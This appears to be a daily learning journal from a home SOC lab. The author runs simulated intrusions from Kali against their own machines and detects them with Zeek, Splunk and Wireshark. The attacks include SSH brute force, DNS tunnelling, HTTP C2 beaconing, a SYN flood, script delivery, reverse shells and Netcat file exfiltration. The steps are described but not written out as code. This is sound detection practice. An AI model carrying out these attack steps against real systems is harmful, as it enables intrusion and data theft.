## Next: add more monitors, run iodine DNS-tunnel and HTTP C2 simulations, build a Splunk dashboard for Zeek detections.


## Day 30 - Zeek + Splunk + Wireshark + Attacks Day
Date: November 17, 2025

Today I focused on expanding the detection capabilities of my SOC Home Lab by integrating Zeek logs with Splunk dashboards and analyzing several simulated attacks from my Kali machine. This session included four offensive techniques, full packet captures, filtering logic in Splunk, MITRE ATT&CK tagging, and even a DoS traffic stress test.

## 1. Zeek Log Integration & Troubleshooting

 • Continued testing Zeek’s full log coverage (conn.log, dns.log, ssh.log, http.log).
 
 • Identified an issue with Splunk searches returning no results — root cause was low disk space (the Raspberry Pi auto-uploaded ~23 GB of PCAPs).
 
 • After cleanup, Splunk resumed indexing normally.
 
 • Verified that all Zeek sources were correctly forwarded from the Raspberry Pi to the Splunk indexer.

## 2. Built and Improved Splunk Dashboards

Created four MITRE ATT&CK-tagged dashboards, each representing one adversary technique:
 
 • T1110.001 – SSH Brute Force (Hydra)
 
 • T1071.004 – DNS Tunneling (iodine)
 
 • T1071.001 – HTTP C2 (beaconing)
 
 • T1046 – Network Scanning (Nmap)

## Improvements:
 
 • Added custom SPL searches for each dataset.
 
 • Added MITRE ATT&CK tags to dashboard names and descriptions.
 
 • Tuned time ranges, event panels, and timeline visualizations.
 
 • Verified that each dashboard reacts in real time during offensive activity.

## 3. SSH Brute Force (Hydra) Visibility
 
 • Ran Hydra brute force from Kali on port 22 against PC2 (192.168.1.50).
 
 • Observed:
 
 • Rapid failed login attempts.
 
 • libssh handshake fingerprints.
 
 • Short session durations.
 
 • Characteristic connection patterns from a brute-force tool.
 
 • Splunk dashboard correctly detected the attack based on:
 
 • High frequency of SSH attempts.
 
 • Repetitive destination port 22.

 • Multiple authentication failures.

## 4. DNS Tunneling Simulation (iodine)
 
 • Started iodine server on PC2 and client on Kali.
 
 • Successfully established a tunnel using exfile.lab.
 
 • Observations:
 
 • Zeek detected strange DNS labels and encoded subdomains.
 
 • Queries marked as unknown or NXDOMAIN.
 
 • Continuous traffic over udp/53.
 
 • Long, suspicious domain names (e.g. yrbcel…exfile.lab).
 
 • Splunk dashboard matched behavior of MITRE T1071.004 DNS data exfiltration.

## 5. HTTP Command & Control (C2 Beaconing)

Simulated a very simple HTTP C2 channel:

• Used the C2 channel to send commands such as whoami, hey and ls.
 
 • Zeek captured:
 
 • /beacon endpoint requests.
 
 • User-Agent "Mozilla/5.0 (C2Client)".
 
 • HTTP 200 OK responses.
 
 • Continuous polling every 2 seconds.
 
 • Wireshark confirmed plaintext command return data (e.g., heythere, whoami).
 
 • Splunk dashboard clearly visualized periodic beaconing, matching T1071.001 HTTP C2.

## 6. Network Scanning Detection (Nmap)
 
 • Performed TCP SYN scans from Kali.
 
 • Zeek detected:
 
 • Large amounts of SYN packets.
 
 • Ports marked with unusual states like OTH and REJ.
 
 • Massive spikes in connection attempts within seconds.

 • Splunk visualization produced clear spikes corresponding to the scan window.

## 7. DoS / SYN Flood Stress Test
 
 • Simulated a flood using hping3:

Results:

 • VM temporarily froze due to traffic volume (expected).
 
 • Wireshark captured:
 
 • Extreme packet rate (4.4 million packets in a short time).
 
 • Repeated RST,ACK patterns.
 
 • Port-number reuse warnings.

 • Zeek logs showed overwhelming flow attempts even though the target couldn’t respond.
 
 • Demonstrated how easily low-resource machines can be overwhelmed.

## 8. Packet Analysis in Wireshark

 • Imported pcap files generated by Zeek.
 
 • Used display filters:
 
 • ip.addr == 192.168.1.50
 
 • http && ip.addr == 192.168.1.50
 
 • Observed:

 • Beacon commands and responses (hey, whoami).
 
 • HTTP 200 OK with text/plain.
 
 • SYN flood signature in bright red blocks.
 
 • DNS tunneling encoded hostname strings.

## 9. Summary & Findings

## Today I completed my first full multi-technique detection workflow using:
 • Zeek → Splunk → Dashboarding → MITRE mapping → Wireshark validation

I demonstrated visibility into:
 • Brute force authentication abuse
 • DNS tunneling / exfiltration
 • HTTP C2 beaconing
 • TCP scanning
 • SYN flood / DoS behavior

Each of these techniques now has:
 • Logs ✔️
 • Splunk detections ✔️
 • Dashboards ✔️
 • MITRE mappings ✔️
 • PCAP evidence ✔️

<img width="1917" height="1076" alt="Captura de pantalla 2025-11-17 112236" src="https://github.com/user-attachments/assets/44f68b7f-1360-4751-9d79-80a0d60df223" />
<img width="1914" height="1072" alt="Captura de pantalla 2025-11-17 111713" src="https://github.com/user-attachments/assets/885e78b8-d92d-4306-ae09-84946175b406" />
<img width="1902" height="1069" alt="Captura de pantalla 2025-11-17 114031" src="https://github.com/user-attachments/assets/c9637538-59d6-4378-bdcf-8cb134e94d3d" />
<img width="1907" height="500" alt="Captura de pantalla 2025-11-17 114256" src="https://github.com/user-attachments/assets/c25eb611-c31c-4c0f-a134-536eb8ad9e2c" />
<img width="1908" height="1065" alt="Captura de pantalla 2025-11-17 114634" src="https://github.com/user-attachments/assets/33be8d99-3561-46fc-ba02-74551c9a8f1a" />
<img width="1919" height="1074" alt="Captura de pantalla 2025-11-17 115437" src="https://github.com/user-attachments/assets/5144b08d-ad11-4704-94be-ed613c144dc9" />
<img width="1914" height="1071" alt="Captura de pantalla 2025-11-17 131341" src="https://github.com/user-attachments/assets/0e416bfd-eb66-41ff-8012-17d25be2d242" />
<img width="1913" height="1070" alt="Captura de pantalla 2025-11-17 150341" src="https://github.com/user-attachments/assets/51e9440f-f43b-4218-b13a-a32d4145e9f1" />
<img width="1914" height="1074" alt="Captura de pantalla 2025-11-17 154417" src="https://github.com/user-attachments/assets/11ab7c09-e599-4551-a55e-bad8c2e46b22" />


## Day 31 - Purple-Team Attack Chain (Second Run)
Date: November 18, 2025

Today I completed the entire purple-team attack chain again inside my offline SOC Home Lab. The goal was to simulate a realistic, multi-stage intrusion and observe every phase with my Raspberry Pi packet-capture sensor and Wireshark.

## 1. Initial Foothold (Reverse Shell)

I established a reverse shell from the victim machine (192.168.1.50) to my Kali box (192.168.1.125).
In Wireshark I could clearly see:

 • The TCP handshake on port 4444
 
 • The interactive shell traffic

 • All commands I typed (whoami, hostname, ip a, etc.) reconstructed inside the TCP stream

This once again showed how obvious reverse shells look in packet captures.


## 2. Privilege Escalation Attempts

Inside the shell I tested basic escalation steps (sudo checks, system info, etc.).
The victim blocked escalation as expected, but Wireshark captured everything — a nice reminder of how much attacker activity leaks into the network layer even during local commands.


## 3. Internal Recon & Lateral Movement

From the compromised host I explored the internal network:

 • ICMP sweeps to 192.168.1.133 and 192.168.1.123

 • Manual TCP port checks (SYN packets easily visible in Wireshark)
 
 • SSH attempts toward 192.168.1.133

Wireshark showed all of it: echo requests, unreachable replies, open port responses, and failed SSH connections.
Even without Zeek, these phases were extremely obvious.


## 4. Data Exfiltration via HTTP

I generated a random binary file on the victim and transferred it to the attacker using a simple Python HTTP server.

Wireshark captured:

 • The full HTTP request

 • The file upload

 • A complete reassembly of the binary payload

 • Several hundred KB of exfiltrated data

 • Clean visual separation between reverse shell, recon, and exfil stages

This step easily confirmed how visible clear-text exfiltration is on a monitored network.


## 5. Full Attack Chain PCAP

All stages ended up inside a single file: attackchainFULL.pcap

It contains:
 
 • Reverse shell traffic
 
 • Privilege escalation attempts

 • ICMP scanning

 • TCP scanning
 
 • Lateral movement
 
 • HTTP exfiltration

 • Previous beacon traffic

It’s a perfect multi-stage intrusion capture for future Splunk tests and detection rule practice.


## 6. Splunk / Zeek Note

During the morning run, Zeek successfully generated logs and Splunk showed:
 
 • Reverse shell connections

 • Port 4444 activity
 
 • HTTP traffic for exfiltration
 
 • Known services

 • Beaconing patterns

During the afternoon run, Zeek was not running, so Splunk missed the entire chain.
This was a great reminder: always check Zeek status before running attacks.


## 7. What I Learned Today
 
 • A full attack chain is much easier to read when all phases are in one PCAP.
 
 • Reverse shells are extremely easy to spot in raw traffic.
 
 • Manual recon (ICMP + TCP) produces very recognizable patterns.

 • Simple HTTP servers can still be used for exfiltration, and the traffic is crystal clear.
 
 • Zeek is essential for SOC visibility; without it, Splunk sees nothing.
 
 • My lab simulations are becoming more structured and realistic each day.

## 8. Next Steps
 
 • Repeat the full chain with Zeek enabled to capture everything into Splunk.
 
 • Build Splunk dashboards for recon, reverse shells, and exfiltration.

 • Create detection logic for beaconing behavior.
 
 • Try a more stealthy exfiltration method (base64, chunked uploads, etc.).

 • Add automation to verify Zeek status before attack simulations.


## 🔥 Final Thoughts

Today I completed the cleanest, most structured purple-team simulation I’ve done so far.
Raspberry Pi capture + Wireshark analysis gave me full visibility of every attack phase.

I’m becoming much more comfortable building realistic offensive scenarios and then analyzing them from a defender’s perspective.


<img width="1906" height="1073" alt="Captura de pantalla 2025-11-18 122154" src="https://github.com/user-attachments/assets/2e321ef6-815b-464e-bc37-6aebfcccd629" />
<img width="1917" height="1072" alt="Captura de pantalla 2025-11-18 122211" src="https://github.com/user-attachments/assets/e237f6d7-dac0-4044-9b7a-e7aba5880f41" />

<img width="1918" height="1070" alt="Captura de pantalla 2025-11-18 123804" src="https://github.com/user-attachments/assets/30e779d5-1ec1-48d4-a434-acfcccbacd5f" />
<img width="1911" height="1078" alt="Captura de pantalla 2025-11-18 123829" src="https://github.com/user-attachments/assets/fa597e86-94fd-4b8e-8d1b-6ba86f061318" />
<img width="1912" height="1068" alt="Captura de pantalla 2025-11-18 132253" src="https://github.com/user-attachments/assets/35af8ea4-90e2-40ef-8e58-b7e06629561c" />

<img width="1918" height="1079" alt="Captura de pantalla 2025-11-18 131458" src="https://github.com/user-attachments/assets/a9f33572-47c5-4c47-a7be-2f022b120bab" />

<img width="1912" height="1073" alt="Captura de pantalla 2025-11-18 132723" src="https://github.com/user-attachments/assets/641f36e5-fe66-4c00-b636-855d38bb35b1" />
<img width="1883" height="219" alt="Captura de pantalla 2025-11-18 143139" src="https://github.com/user-attachments/assets/16996971-6692-4684-ba23-cceb8c564330" />

<img width="1908" height="1073" alt="Captura de pantalla 2025-11-18 151114" src="https://github.com/user-attachments/assets/a0c8cc99-1d63-434b-abb4-25704aeb833f" />

<img width="1904" height="219" alt="Captura de pantalla 2025-11-18 152443" src="https://github.com/user-attachments/assets/afbfca42-9d24-4cad-b895-b332689e5894" />
<img width="1914" height="1068" alt="Captura de pantalla 2025-11-18 214854" src="https://github.com/user-attachments/assets/3b8afd6a-e466-4a64-a76b-e6c4bda0b709" />
<img width="1913" height="1075" alt="Captura de pantalla 2025-11-18 221037" src="https://github.com/user-attachments/assets/70e03e01-6c5a-4e36-94e0-58afc51746b3" />
<img width="1912" height="1073" alt="Captura de pantalla 2025-11-18 221451" src="https://github.com/user-attachments/assets/94052828-8d4b-479a-a884-550971dd112b" />
<img width="1916" height="1071" alt="Captura de pantalla 2025-11-18 221300" src="https://github.com/user-attachments/assets/3aab82b2-cac4-4310-87b1-3ec4dcc87ff0" />


## Day 32 - Practice and practice and practice 
Date: November 19, 2025

Today I continued developing my SOC Home Lab by practicing two attack chains:
 
 1. The short 4-step chain (recon → reverse shell → pivoting → file exfiltration)
 
 2. The “real-world-style” chain (delivering a malicious script + command-and-control callback + exfiltration attempt)

Even though the second chain wasn’t fully captured by Zeek, I successfully executed most of the steps and validated them through Wireshark and Splunk.


## 🛠 1. Short Attack Chain — Full Success

I repeated the compact attack chain I learned yesterday, but this time much faster and more confidently.

## What I completed:

 • ICMP reconnaissance from Kali → victim
 
 • Reverse shell from victim → Kali

 • Port scanning from inside the victim (pivot stage)
 
 • File exfiltration using Netcat (working .txt file)

 • Full Wireshark inspection of:

 • SYN scans
 
 
 • ICMP Echo/Replies
 
 • Reverse shell traffic on port 4444
 
 • Exfiltrated file contents (visible in Follow TCP Stream)
 
 • Splunk confirmation using:
 
 • sourcetype=zeek (from earlier test)
 
 • stats count by id.orig_h, id.resp_h, resp_p
 
 • Time-aligned events for the exfiltration packet

## Important win:

I successfully located the exact TCP packet with the exfiltrated text, pulled it by timestamp from Splunk, and confirmed the raw file content in Wireshark.
This shows I’m learning to correlate network + SIEM — SOC Analyst core skill.


## 🛠 2. “Real-World” Attack Chain Attempt

This was more complex:
deliver a script → victim executes it → callback → optional exfiltration.

## What worked:


✔ Built helper_tool.sh manually

✔ Served it over HTTP from Kali (port 8080)

✔ Victim downloaded it with curl -O

✔ Script executed successfully

✔ Script printed fake “Installing system helper…” (malware simulation)

✔ Wireshark captured the HTTP GET request for helper_tool.sh

## What did NOT work today:


⚠ Zeek was not capturing → no Zeek logs in Splunk

⚠ Exfiltration stage not completed

⚠ Reverse shell callback failed because I forgot to open listener in time

But: all other stages worked exactly as expected.

## 🔍 3. Wireshark Traffic Analysis (Successful)

I inspected all key packets:

HTTP GET

GET /helper_tool.sh HTTP/1.1 — clearly visible with User-Agent curl/7.x

Reverse Shell Attempts

Traffic on:
 • Port 4444
 • Port 8080
 • Port 9001

Exfiltration analysis

Found the exact packet (Len=28) containing:

top top top secret info

Verified in:
 • Hex pane
 • ASCII pane
 • Full TCP Stream reconstruction

<img width="1909" height="1075" alt="Captura de pantalla 2025-11-19 130225" src="https://github.com/user-attachments/assets/213bd66b-6adc-4e15-9317-9a7f0909c9ce" />
<img width="1906" height="1065" alt="Captura de pantalla 2025-11-19 130624" src="https://github.com/user-attachments/assets/754f396b-3f8c-4faf-a2d2-ed471468a773" />

<img width="1912" height="1075" alt="Captura de pantalla 2025-11-19 130645" src="https://github.com/user-attachments/assets/46c4865f-5c5a-4d75-bd24-c8423ee38fdf" />
<img width="1918" height="1077" alt="Captura de pantalla 2025-11-19 133901" src="https://github.com/user-attachments/assets/d5f8a34c-837b-4b80-9b51-5e0b6342aa32" />
<img width="1904" height="1075" alt="Captura de pantalla 2025-11-19 135523" src="https://github.com/user-attachments/assets/be1510f3-ed07-4ade-b2ea-969b0ba10743" />
<img width="1906" height="1073" alt="Captura de pantalla 2025-11-19 142117" src="https://github.com/user-attachments/assets/67aadec5-81c3-443f-a143-ea8d1bff0a31" />
<img width="1919" height="1077" alt="Captura de pantalla 2025-11-19 144356" src="https://github.com/user-attachments/assets/627492fc-e262-4ac2-9d3c-f60ada795c0b" />
<img width="1901" height="549" alt="Captura de pantalla 2025-11-19 151339" src="https://github.com/user-attachments/assets/06461ea3-4c04-4118-a99c-1a8bdf27b45c" />


## Day 33 - Full attack chain inside the isolated SOC Home Lab
Date: November 20, 2025

Today I focused on validating my full attack chain inside the isolated SOC Home Lab, using Splunk, Zeek, Wireshark and manual command-line analysis.
This was the most complete and realistic end-to-end test so far.

## 🔹 1. Successful Data Exfiltration Chain

I repeated the full attack workflow:

 • Delivered and executed the helper_tool.sh script from Kali → victim Ubuntu
 
 • Established a reverse shell connection on port 4444
 
 • Generated a binary file (topsecret.bin) and exfiltrated it to Kali over port 9001
 
 • Verified file integrity with md5sum on both machines

Everything worked perfectly.

## 🔹 2. Network Traffic Analysis

I captured and analyzed all stages using both tools:

 • Wireshark → Identified TCP streams for 8080 (initial download), 4444 (reverse shell), 9001 (file exfiltration)
 
 • Used filters like tcp.port==9001 and tcp.stream==1269 to locate the exact transfer
 
 • Followed the TCP stream to see binary fragments of the exfiltrated file

 • Confirmed that the PCAP matched the Splunk/Zeek logs by timestamp

## 🔹 3. Zeek + Splunk Correlation

Zeek generated clean logs for:
 
 • Initial access (port 8080)
 
 • Reverse shell (port 4444)
 
 • Exfiltration (port 9001)

In Splunk I successfully correlated:
 
 • src_ip = 192.168.1.50
 
 • dest_ip = 192.168.1.125
 
 • orig_bytes = 204800 (exact file size!)
 
 • durations, connection flags, and protocol transitions

This confirmed Zeek was capturing the event correctly and Splunk was parsing fields normally (after minor renaming).

## 🔹 4. Dashboard Work (Partial)

I started building a multi-panel Splunk dashboard for:
 
 • Stage 3 summary (total exfil bytes)

 • Exfil timeline (port 9001)
 
 • Full chain overview

I still need to clean the XML and finish all panels → leaving this for another session.


📌 Overall Result

Today I completed my first full real-world attack chain in the lab with full visibility:


✔ Kali attacker

✔ Victim Ubuntu

✔ Reverse shell

✔ Lateral commands

✔ Data exfiltration

✔ Wireshark PCAP confirmation

✔ Zeek + Splunk correlation

✔ Hash validation of stolen file

<img width="1919" height="1077" alt="Captura de pantalla 2025-11-20 092231" src="https://github.com/user-attachments/assets/963de688-0e23-45e2-a118-364968bd7a54" />
<img width="1911" height="1066" alt="Captura de pantalla 2025-11-20 094229" src="https://github.com/user-attachments/assets/41337917-4349-4703-b3f3-de674a4a87d8" />

<img width="1918" height="1074" alt="Captura de pantalla 2025-11-20 100635" src="https://github.com/user-attachments/assets/a41a4593-3ca1-490c-8eb2-38653fc3bc5c" />

<img width="1919" height="1074" alt="Captura de pantalla 2025-11-20 091657" src="https://github.com/user-attachments/assets/635132f8-e492-4665-a7d3-499e26c18913" />

<img width="1909" height="1073" alt="Captura de pantalla 2025-11-20 094736" src="https://github.com/user-attachments/assets/acea94b3-65f5-4824-9e32-a8ae1eb18287" />
<img width="1915" height="1076" alt="Captura de pantalla 2025-11-20 100337" src="https://github.com/user-attachments/assets/371d9eb7-39ba-4f76-9912-cb2f82c539a6" />
<img width="1915" height="1068" alt="Captura de pantalla 2025-11-20 101023" src="https://github.com/user-attachments/assets/cb024443-eb0e-41c2-b55b-adeedcdd8cb0" />
<img width="1918" height="1078" alt="Captura de pantalla 2025-11-20 101742" src="https://github.com/user-attachments/assets/fd658373-47ff-4dfe-8c43-462393e8c854" />

<img width="1914" height="1074" alt="Captura de pantalla 2025-11-20 104143" src="https://github.com/user-attachments/assets/1df64ef9-c9bb-46b8-8ebb-a3e41e8328b4" />

## Day 34 - Full Attack Chain – Complete End-to-End Replication
Date: November 21, 2025

Today I successfully repeated the full attack chain scenario in my isolated SOC home lab. This included:

## 1. Reverse Shell (Port 4444)
 
 • Re-established a functional reverse shell from attacker (Kali) → victim (Ubuntu).
 
 • Verified full packet flow in Wireshark (tcp.stream analysis).
 
 • Confirmed Zeek detection (known_services.log, conn.log).
 
 • Splunk dashboard displayed real-time events with correct field mappings.

## 2. HTTP Tool Delivery (Port 8080)
 
 • Served helper_tool.sh from the attacker using Python HTTP server.
 
 • Victim downloaded it via curl (HTTP/1.1 200 OK).
 
 • Verified the activity in:
 
 • Wireshark (HTTP GET, MIME type text/x-shellscript)
 
 • Zeek HTTP logs
 
 • Splunk visualization panel

## 3. File Exfiltration (Port 9001)
 
 • Created two files on the victim:
 
 • .txt
 
 • .bin
 
 • Exfiltrated both to the attacker over TCP port 9001 using Netcat.
 
 • Verified:
 
 • Packet payloads in Wireshark (PSH+ACK with data)
 
 • File size correlation in Zeek (orig_bytes / resp_bytes)
 
 • Real-time Splunk dashboard updates
 
 • Recomputed MD5 on both sides → integrity confirmed.

## 4. Reconnaissance & Movement
 
 • Generated ICMP network scans + SSH activity to map sessions.
 
 • Observed scan traffic in Wireshark and Zeek.
 
 • Viewed SSH sessions (encrypted traffic) to validate MITRE mapping.

## 5. Dashboard Testing (Real-Time)

 • Built a simplified Splunk dashboard showing:
 
 • Port 4444 (reverse shell)
 
 • Port 8080 (HTTP transfer)
 
 • Port 9001 (exfiltration)
 
 • Ran the entire attack chain again → dashboard showed all stages in real time.


📘 MITRE ATT&CK Mapping Added to Notes

Today I finalized correct ATT&CK classification for each phase:
 
 • T1046 – Network Scanning
 
 • T1059 – Command Execution
 
 • T1105 – Ingress Tool Transfer
 
 • T1021.004 – Remote Services (SSH)
 
 • T1041 / T1048 – Data Exfiltration
 
 • T1078 / T1110 – Valid Accounts / Brute Force

This mapping will be used later for building detection rules and documentation

<img width="1913" height="1073" alt="Captura de pantalla 2025-11-21 122555" src="https://github.com/user-attachments/assets/21187ddf-b613-4d45-a6f7-d9d20010c7db" />
<img width="1916" height="1072" alt="Captura de pantalla 2025-11-21 122603" src="https://github.com/user-attachments/assets/121f7e7f-8a62-4629-9bd3-a2f7bba3bb52" />
<img width="1907" height="1074" alt="Captura de pantalla 2025-11-21 122843" src="https://github.com/user-attachments/assets/295eb0ed-cd68-4193-b00e-eabe5bc68210" />

<img width="1912" height="1068" alt="Captura de pantalla 2025-11-21 123717" src="https://github.com/user-attachments/assets/25c9c128-723f-4e0b-ae0d-d689456a6152" />

<img width="1909" height="1074" alt="Captura de pantalla 2025-11-21 124228" src="https://github.com/user-attachments/assets/8a686920-7ade-4811-a6e2-0011c4da7b02" />

<img width="1908" height="1077" alt="Captura de pantalla 2025-11-21 133216" src="https://github.com/user-attachments/assets/262ed9fc-6e4e-476e-a3b4-d72687d332a9" />

<img width="1915" height="909" alt="Captura de pantalla 2025-11-21 134447" src="https://github.com/user-attachments/assets/9eef8d2c-ca4f-4b8b-b6d4-2c304d7a6eae" />
<img width="1911" height="1074" alt="Captura de pantalla 2025-11-21 135046" src="https://github.com/user-attachments/assets/d730347e-4ce7-4d4b-a245-714e8921549c" />

<img width="1919" height="1076" alt="Captura de pantalla 2025-11-21 135446" src="https://github.com/user-attachments/assets/94f328da-5fdf-4b87-9c0e-15cf514b90b1" />
<img width="1910" height="622" alt="Captura de pantalla 2025-11-21 135549" src="https://github.com/user-attachments/assets/035ef734-8df4-4336-961a-e3bc651ce63a" />


## Day 35-36  — New Host Laptop Setup & Integration
Date:November 24-25, 2025

## 🟩 1. Searching + Buying New Host Laptop
During these two days I focused on upgrading my main host machine.  
Key steps:
- Spent time comparing laptops (HP Pavilion vs ThinkPad models).
- Finally found and bought a ThinkPad T14 Gen 1 (Ryzen 5).
- Checked its hardware, installed RAM, and verified all ports (USB-C, HDMI, Ethernet).

## 🟩 2. Hardware Preparation
- Opened the laptop, cleaned dust, replaced thermal paste.
- Added an extra RAM module (temporary 4 GB → total 20 GB).
- Swapped the NVMe SSD from old HP → new ThinkPad.
- Verified temperatures, fans, and system stability.

## 🟩 3. Installing Linux Mint (New Host OS)
- Created bootable USB and installed Linux Mint as main OS.
- Completed initial updates, drivers, and system tweaks.
- Installed essential packages:
  - Terminal tools (htop, neofetch, networking tools)
  - Python + VS Code
  - SSH, OpenSSH Server
  - Git, Curl, QEMU support

## 🟩 4. Preparing the Host for the SOC Lab
- Configured all networking settings for isolated lab use.
- Ensured compatibility with:
  - Splunk Enterprise (indexer)
  - SSH access to Kali, Pi, and PC2
  - Multi-monitor setup for SOC workflow
- Tested ports, firewall, and routing behavior.
- Verified the ThinkPad works stable as the main SOC Host Machine.

## 🟩 5. Migration from Old Host Laptop
- Backed up VirtualBox VMs (optional storage).
- Moved all previous SOC project files.
- Confirmed everything needed for:
  - Splunk dashboards
  - Wireshark analysis
  - Proxmox Web management
  - Raspberry Pi capture workflow

## 🟢 Result (End of 25 November)
- New ThinkPad host fully installed, optimized, and integrated.
- Ready for reconnection with Proxmox, Kali, Pi, Splunk Enterprise, and PC2.
- System running fast, cool, and smooth → perfect for SOC workflows.


## Day 37 — Rebuilding Lab Connectivity & New Splunk Forwarder
Date:November 26, 2025 

### Goals
- Give the Proxmox server controlled access to the Internet without breaking the isolated lab network.
- Rebuild my Linux Mint “PC2” forwarder on an old ASUS laptop and connect it to Splunk.
- Make sure the lab can run with screens closed / headless when needed.

### Work Performed

#### 1. Proxmox server networking re-work (eno1 + eno2)
- Reviewed current network state on the Proxmox host:
  - ip a, ip route
  - Interfaces: eno1, eno2, eno3, eno4, and bridge vmbr0 (lab IP `192.168.1.10/24`).
- Goal:  
  - eno2 + vmbr0 → internal lab network (as before).  
  - eno1 → Internet via home router (same 192.168.1.0/24 subnet).
- Edited /etc/network/interfaces on the Proxmox host to:
  - Keep vmbr0 static: address 192.168.1.10/24, gateway 192.168.1.1, bridge-ports eno2.
  - Configure eno1 with DHCP:
       auto eno1
    iface eno1 inet dhcp
    - Restarted networking and validated:
  - ip a show eno1 → got a DHCP address from the router.
  - ip route → default route via eno1.
- Fixed DNS resolution:
  - Created /etc/resolv.conf or equivalent to use public DNS:
    - nameserver 1.1.1.1
    - nameserver 8.8.8.8
    - fallback 1.0.0.1
  - Verified:
    - ping 1.1.1.1 and ping 8.8.8.8 succeed.
    - ping google.com works again.
    - 
---

### 2. New Linux Mint forwarder on ASUS N71J (PC2)
- Picked up a used ASUS N71J laptop (no RAM/SSD/charger originally).
- Installed RAM + SSD I already had.
- Booted from USB and installed Linux Mint as the OS.
- Configured power management:
  - Turn off screen after inactivity.
  - Never suspend on AC.
  - Allow the laptop to keep running with the lid closed (good for SSH/headless use).
- Installed Splunk Universal Forwarder on PC2:
  - Enabled the service and checked status with:
       sudo /opt/splunkforwarder/bin/splunk status
      - Confirmed splunkd and helper processes are running.
- Configured the forwarder to send logs to my Splunk indexer on the host laptop.
- Verified in Splunk Web:
  - New events are arriving from:
    - Proxmox server (host)
    - PC2 (ASUS N71J Linux Mint)
  - Source types and hosts look as expected.

---

### 3. ThinkPad boot / PXE annoyance
- Sometimes the ThinkPad tried to PXE boot over IPv4 when the Ethernet cable was connected.
- Opened BIOS and:
  - Moved PXE boot entries to the Excluded from Boot Priority Order list.
  - Ensured the main boot order is:
    1. Ubuntu
    2. NVMe0
    3. Windows Boot Manager
- Result: laptop now boots straight into Ubuntu even with Ethernet plugged in.

---

### Results / Status
- Proxmox:
  - Has working Internet through eno1 while still serving the lab via eno2 + vmbr0.
  - Can update packages again and resolve DNS properly.
- PC2:
  - Linux Mint installed, configured, and running as a Splunk forwarder.
  - Can run with lid closed and be managed via SSH from the host.
- ThinkPad host:
  - Boot sequence is stable (no more PXE over IPv4 surprise when Ethernet is connected).

---

### Next Steps
- Add/verify a Zeek
- Clean up Splunk:
  - Tag and normalize hosts (`host=proxmox-server`, host=pc2-n71j, etc.).
  - Start building focused dashboards for:
    - Forwarder health
    - Network events from Proxmox and PC2

## Day 38 - Daily Lab Progress
Date:November 27, 2025

## 🟩 1. Proxmox Internet + Lab Network Fully Repaired
Today I finally fixed the long-standing problem where Proxmox lost internet every time I connected lab cables.  
Main achievements:
- Correct NIC mapping confirmed:
  - eno1 → Internet (home router)
  - eno2 → Lab network (isolated SOC environment)
- Both NICs now work simultaneously without breaking the Proxmox Web GUI.
- System successfully updated via apt update && apt upgrade.
- Stable connectivity from the new ThinkPad host.

## 🟩 2. Raspberry Pi Sensor (Zeek + tcpdump)
- SSH trust (ED25519 keys) recreated after hostname changes.
- Pi sending screenshots and pcaps automatically again.
- Pi forwarder visible in Splunk.
- Zeek works, but field normalization requires the Splunk TA (pending).

## 🟩 3. Splunk: All Forwarders Active
- Host ThinkPad, Proxmox, Kali, Raspberry Pi, and PC2 are sending logs.
- Splunk Web is stable after hostname change.
- Time sync across devices fixed — no timestamp mismatches.

## 🟩 4. PC2 (Old ASUS N71J) Added to Lab
- Installed Linux Mint on the €5 laptop.
- Enabled SSH with lid closed (headless mode).
- Installed Splunk Universal Forwarder → logs visible instantly.
- Cleaned fans and verified stable temps and performance.

---

# 🟦 5. ATTACK CHAIN TESTING
Today I successfully executed two attack chains:

---

## 🔹 Attack Chain #1 — Short Version
- Recon → SSH brute-force → persistence → reverse shell
- Events captured in:
  - Splunk (SSH failures, successful login, process creation)
  - Pi tcpdump (network traffic)
  - Wireshark (packet-level detail)

---

## 🔹 Attack Chain #2 — Full Payload Chain
This was the main highlight of the day — a more realistic intrusion flow using a downloaded payload.

### Steps performed:
1. Initial Access (Social Engineering Simulation)
   - Victim downloaded a script:  
     helper/update_script.sh
   - Script created a directory and downloaded a malicious payload inside the victim machine.

2. Payload / Malware Deployment
   - Payload executed by the victim.
   - Created persistence directory.
   - Dropped reverse shell components.

3. Command & Control
   - Reverse shell established back to Kali on port 4444.
   - Attacker operated inside the victim.

4. Internal Recon
   - ifconfig, arp -a, netstat, directory listing.
   - Splunk: Events appeared correctly.

5. Lateral Movement
   - Attacker probed PC2 and other lab systems.

6. Data Exfiltration
   - Two files exfiltrated:  
     - 1x TXT  
     - 1x BIN  
   - Verified in Splunk via packet size and timestamp.
   - Found matching packet in Wireshark (line *694557*).

Everything was successfully detected in Splunk & Wireshark.  
Zeek logs will be added tomorrow after TA installation.

---

# 🟣 6. Additional Work
- Installed VS Code and optimized terminal tools.
- Configured ThinkPad dual-monitor setup (USB-C + HDMI).
- Set up SSH usage while PC2 lid is closed.
- Verified stable capturing on Raspberry Pi.

---

# 🟢 Overall Status (End of Day)
- ✅ Proxmox fixed  
- ✅ Pi sending captures  
- ✅ All Splunk forwarders online  
- ✅ Full attack chain completed (twice)  
- ✅ Payload chain working  
- ⚠️ Zeek TA still missing (install tomorrow)  
- ⚠️ Multi-panel dashboards pending  

---

# 🎯 Next Steps:
- Install Splunk TA for Zeek & verify field extractions.  
- Run the full payload chain again but with Zeek + Splunk dashboards.  
- Save and analyze PCAP in Wireshark (deep dive).  
- Strengthen dashboards for Recon → Execution → C2 → Exfiltration.  
- 30 min TryHackMe SOC rooms.


<img width="5760" height="1080" alt="Screenshot from 2025-11-27 13-41-47" src="https://github.com/user-attachments/assets/d903d5b2-0a51-4919-87b5-70cdeb8ec191" />
<img width="5760" height="1080" alt="c" src="https://github.com/user-attachments/assets/828372f5-2e0f-4e44-9146-cb1d3ad9761d" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-27 13-55-56" src="https://github.com/user-attachments/assets/59ae7151-6161-49ea-b886-1c49e1f05758" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-27 14-11-12" src="https://github.com/user-attachments/assets/21c5faa9-556c-4955-9735-ada689c4208b" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-27 14-48-12" src="https://github.com/user-attachments/assets/58325e45-1bca-44b2-890d-d48d2785d98b" />
<img width="5760" height="1080" alt="Screenshot from 2025-11-27 14-50-00" src="https://github.com/user-attachments/assets/b86bc7fc-5d1f-428f-bdcc-5741ed4bf1f3" />


## Day 39 — SSH automation, running a full malicious attack chain, capturing all network evidence
Date:November 28, 2025

## 🔐 1. SSH Trust & Key Configuration Fixed

- Resolved the remote host identification error.
- Cleaned old fingerprints from ~/.ssh/known_hosts.
- Configured passwordless SSH using ED25519 keys.
- Verified that both SSH and SCP now work without password prompts.
